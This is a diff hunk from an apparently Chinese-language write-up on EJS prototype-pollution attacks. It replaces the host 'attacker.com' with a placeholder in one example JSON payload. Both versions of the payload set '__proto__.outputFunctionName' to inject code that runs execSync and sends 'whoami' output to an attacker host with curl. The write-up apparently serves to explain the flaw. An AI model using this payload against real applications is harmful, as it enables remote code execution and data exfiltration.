@@ -60,7 +60,7 @@ EJS 在渲染时，会读取配置对象中的 `outputFunctionName` 属性，如
     ```json
     {
       "__proto__": {
-        "outputFunctionName": "x; const exec = require('child_process').execSync; exec('curl http://attacker.com/' + exec('whoami')); //"
+        "outputFunctionName": "x; const exec = require('child_process').execSync; exec('curl http://<attacker-domain>/' + exec('whoami')); //"
       }
     }
     ```
